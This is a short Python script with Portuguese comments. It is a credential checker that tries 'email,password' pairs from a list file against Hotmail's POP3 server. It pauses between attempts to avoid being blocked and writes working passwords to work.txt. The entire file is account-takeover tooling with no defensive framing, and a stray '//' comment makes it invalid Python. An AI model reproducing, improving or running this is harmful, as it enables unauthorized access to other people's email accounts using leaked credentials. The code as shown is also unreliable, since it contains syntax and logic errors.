import poplib,time
 
login = open("lista.txt","r")
"""
a lista.txt deve ta no seguinte formato
login,senha ex:
test@hotmail.com,123456 # usuario 1
test02@hotmail.com,123456 # usuario 2
# e por assim vai
"""
for line in login.readlines():
    line = line.split(',') // separar o login e a senha pela pela ","
    time.sleep(15) # evitar bloqueio do hotmail
    try:
        M = poplib.POP3_SSL('pop3.live.com', 995) # conectar no pop do hotmail
        M.user(line[0]) # pega o login
        M.pass_(line[1])# pega a senha
       
    except:
        erro = open("erro.txt","a")
        erro.write(line[1])
        print ("usuário invalido")
        erro.close()
    else:
        save = open("work.txt","a")
        save.write(line[1])
        print ("Login feito com sucesso")
        save.close()
